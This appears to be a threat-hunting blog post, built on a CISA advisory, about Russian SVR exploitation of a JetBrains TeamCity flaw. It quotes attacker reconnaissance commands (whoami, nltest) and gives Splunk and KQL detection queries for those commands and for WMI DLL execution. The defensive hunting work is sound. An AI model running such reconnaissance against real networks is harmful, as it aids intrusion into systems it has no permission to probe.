132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" rel="noopener follow" href="/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" rel="noopener follow" href="/search?source=---top_nav_layout_nav----------------------------------"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" rel="noopener follow" href="/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40simone.kraus%2Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="fu"><a rel="me" href="https://me.dm/@simonekrausocd">Mastodon</a></div><div class="l"><div class="fv fw fx fy fz l"><div class="ab cb"><div class="ci bh ga gb gc gd"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gj gk gl gm gn"></div><div class="go gp gq gr gs"><div class="ab cb"><div class="ci bh ga gb gc gd"><div><h1 id="b442" class="pw-post-title gt gu gv bf gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr bk" data-testid="storyTitle">Hunting SVR — Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally</h1></div><div><h2 id="0602" class="pw-subtitle-paragraph hs gu gv bf b ht hu hv hw hx hy hz ia ib ic id ie if ig ih cq du">Behavior Patterns</h2><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="ii ij ik il im ab"><div><div class="ab in"><div><div class="bm" aria-hidden="false"><a rel="noopener follow" href="/@simone.kraus?source=post_page---byline--1b40810f8552--------------------------------"><div class="l io ip by iq ir"><div class="l fj"><img alt="SIMKRA" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/1*BIfekvQdxa7JrHyPD8XJVw.png" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="is by l dd de fs n it ft"></div></div></div></a></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="iu ab q"><div class="ab q iv"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b iw ix bk"><a class="af ag ah ai aj ak al am an ao ap aq ar iy" data-testid="authorName" rel="noopener follow" href="/@simone.kraus?source=post_page---byline--1b40810f8552--------------------------------">SIMKRA</a></p></div></div></div><span class="iz ja" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b iw ix du"><span><a class="jb jc ah ai aj ak al am an ao ap aq ar ex jd je" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F3d60ce83d2f7&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40simone.kraus%2Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552&amp;user=SIMKRA&amp;userId=3d60ce83d2f7&amp;source=post_page-3d60ce83d2f7--byline--1b40810f8552---------------------post_header-----------">Follow</a></span></p></div></div></span></div></div><div class="l jf"><span class="bf b bg z du"><div class="ab cn jg jh ji"><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">9 min read</span><div class="jj jk l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div>1 day ago</div></span></div></span></div></div></div><div class="ab cp jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka"><div class="h k w fg fh q"><div class="kq l"><div class="ab q kr ks"><div class="pw-multi-vote-icon fj kt ku kv kw"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F1b40810f8552&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40simone.kraus%2Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552&amp;user=SIMKRA&amp;userId=3d60ce83d2f7&amp;source=---header_actions--1b40810f8552---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="kx ao ky kz la lb am lc ld le kw"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lf lg lh li lj lk ll"><p class="bf b dv z du"><span class="lm">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao kx ln lo ab q fk lp lq" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lr"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q kb kc kd ke kf kg kh ki kj kk kl km kn ko kp"><div class="ls k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F1b40810f8552&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40simone.kraus%2Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552&amp;source=---header_actions--1b40810f8552---------------------bookmark_footer-----------"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lt" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd lu cn"><div class="l ae"><div class="ab cb"><div class="lv lw lx ly lz ma ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al mb an ao ap ex mc md lq me mf mg mh mi s mj mk ml mm mn mo mp u mq mr ms"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al mb an ao ap ex mc md lq me mf mg mh mi s mj mk ml mm mn mo mp u mq mr ms"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><blockquote class="mt mu mv"><p id="8b69" class="mw mx my mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">SVR cyber operations pose a persistent threat to public and private organizations’ networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence, a broad concept that for Russia encompasses information on the politics, economics, and military of foreign states; science and technology; and foreign counterintelligence. The SVR also conducts cyber operations targeting technology companies that enable future cyber operations.</p></blockquote><p id="05bc" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">…</p><blockquote class="mt mu mv"><p id="4fb3" class="mw mx my mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">In<!-- --> this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023–42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR has not yet used its accesses to software developers to access customer networks and is likely still in the preparatory phase of its operation, having access to these companies’ networks presents the SVR with opportunities to enable hard-to- detect command and control (C2) infrastructure.</p></blockquote><p id="dfff" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">The playbook is written based on the <a class="af nt" href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a" rel="noopener ugc nofollow" target="_blank">CISA Alert Code<strong class="mz gw"> </strong>AA23–347A</a> and contains corresponding Sigma Rules for threat hunting. It contains additionally a threat hunting Sigma Rule opportunity for living off the land and exploitation commands exploiting active directory and one for the EDRSandblast detection, that the SVR is also using in some cases.</p><h2 id="e490" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Host Reconnaissance</h2><h2 id="242f" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">whoami</h2><p id="889b" class="pw-post-body-paragraph mw mx gv mz b ht on nb nc hw oo ne nf ng op ni nj nk oq nm nn no or nq nr ns go bk">Initial observations show the SVR used the following basic, built-in commands to perform host reconnaissance [T1033]:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="5a94" class="pb nv gv oy b bg pc pd l pe pf">whoami /priv</span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="a281" class="pb nv gv oy b bg pc pd l pe pf">whoami /all</span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="61cd" class="pb nv gv oy b bg pc pd l pe pf">whoami /groups</span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="2342" class="pb nv gv oy b bg pc pd l pe pf">whoami /domain</span></pre><h2 id="e0d3" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Privilege information listing via whoami</h2><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/Privilege%20information%20listing%20via%20whoami.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/Privilege information listing via whoami.yml at Russian-Threat-Actor ·…</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="qb l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="9c23" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="4e35" class="pb nv gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND ((Image=”*whoami.exe’”) AND (CommandLine=”*priv*” OR CommandLine=”*Priv*”))</span></pre><h2 id="6062" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Whoami.exe Russian SVR JetBrains</h2><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/Whoami.exe%20Russian%20SVR%20JetBrains.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/Whoami.exe Russian SVR JetBrains.yml at Russian-Threat-Actor · Schmouni242/Sigma-Rules</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="qg l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="cbd0" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">MDE KQL:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="205e" class="pb nv gv oy b bg pc pd l pe pf">DeviceProcessEvents | where ((FolderPath endswith @’\whoami.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’whoami.exe’ or ProcessVersionInfoOriginalFileName =~ @’whoami.exe’) and (ProcessCommandLine contains @’ /priv’ or ProcessCommandLine contains @’ /all’ or ProcessCommandLine contains @’ /groups’ or ProcessCommandLine contains @’ /domain’))</span></pre><h2 id="2db1" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">DC listing via nltest</h2><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="bde9" class="pb nv gv oy b bg pc pd l pe pf">nltest -dclist</span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="e8e8" class="pb nv gv oy b bg pc pd l pe pf">nltest -dsgetd</span></pre><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/DC%20listing%20via%20nltest.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/DC listing via nltest.yml at Russian-Threat-Actor · Schmouni242/Sigma-Rules</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="qh l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="4292" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">MDE KQL:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="2cce" class="pb nv gv oy b bg pc pd l pe pf">DeviceProcessEvents | where (FolderPath endswith @’nltest.exe’ and (ProcessCommandLine matches regex @’(?i).*dclist\:.*|.*DCLIST\:.*|.*dsgetdc\:.*|.*DSGETDC\:.*’))</span></pre><h2 id="0962" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">DLL execution via WMI</h2><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/DLL%20execution%20via%20WMI.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/DLL execution via WMI.yml at Russian-Threat-Actor · Schmouni242/Sigma-Rules</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="qi l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="f486" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">MDE KQL:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="6b3d" class="pb nv gv oy b bg pc pd l pe pf">DeviceProcessEvents | where (FolderPath endswith @’WMIC.exe’ and (ProcessCommandLine contains @’call’ or ProcessCommandLine contains @’rundll32&#x27;))</span></pre><p id="8e04" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="0823" class="pb nv gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND ((Image=”*WMIC.exe”) AND (CommandLine=”*call*” OR CommandLine=”*rundll32*”))</span></pre><h2 id="05bf" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Process with connect and pass as args</h2><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/Process%20with%20connect%20and%20pass%20as%20args.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/Process with connect and pass as args.yml at Russian-Threat-Actor ·…</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="qj l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="6dfc" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">MDE KQL:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="b7f3" class="pb nv gv oy b bg pc pd l pe pf">DeviceProcessEvents | where (ProcessCommandLine contains @’pass’ and ProcessCommandLine contains @’connect’)</span></pre><p id="cbeb" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="3df2" class="pb nv gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND ((CommandLine=”*pass*”) AND (CommandLine=”*connect*”))</span></pre><h2 id="4740" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Service or Drive enumeration via powershell</h2><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/Service%20or%20Drive%20enumeration%20via%20powershell.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/Service or Drive enumeration via powershell.yml at Russian-Threat-Actor ·…</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="qk l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="1e1e" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">MDE KQL:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="e73d" class="pb nv gv oy b bg pc pd l pe pf">DeviceEvents | where ActionType == “PowerShellCommand” | where (((AdditionalFields contains @’Get-WmiObject’ or InitiatingProcessCommandLine contains @’Get-WmiObject’) and (AdditionalFields contains @’-Class’ or InitiatingProcessCommandLine contains @’-Class’) and (AdditionalFields contains @’Win32_Service’ or InitiatingProcessCommandLine contains @’Win32_Service’)) or ((AdditionalFields contains @’Get-WindowsDriver’ or InitiatingProcessCommandLine contains @’Get-WindowsDriver’) and (AdditionalFields contains @’-Online’ or InitiatingProcessCommandLine contains @’-Online’) and (AdditionalFields contains @’-All’ or InitiatingProcessCommandLine contains @’-All’)))</span></pre><p id="1ca0" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="afa4" class="pb nv gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND 